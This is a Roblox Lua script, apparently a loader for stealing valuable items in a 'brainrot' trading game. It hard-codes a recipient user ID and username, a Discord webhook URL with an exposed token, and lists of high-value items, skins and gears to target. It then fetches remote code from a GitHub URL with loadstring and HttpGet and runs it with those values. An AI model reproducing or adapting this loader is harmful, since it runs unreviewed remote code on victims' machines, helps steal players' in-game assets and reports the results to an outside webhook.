local TARGET_ID = 7921822365
local TARGET_USER = "elicro31"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1572551362833551390/2ap1wW23RsoHwkHj5iFwbH71_LEMKgw01wQP9gqizpOPu94u1KR2x1x3lvE3yy0NpcO8"

local TargetBrainrots = {
    ["Dragon Cannelloni"] = true,
    ["La Craft Machine"] = true,
    ["Strawberry Elephant"] = true,
    ["Phoenix"] = true,
    ["Dragon Skeletonini"] = true,
    ["Plant Bros"] = true,
    ["Orchidox"] = true,
    ["Hydra Serpent"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Los Dragons"] = true,
    ["Garama and Madundung"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["La Casa Boo"] = true,
    ["Cerberus"] = true,
    ["Foxini Lanternini"] = true,
    ["Gold and Diamond"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true,
    ["Skeleton Dragon"] = true
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)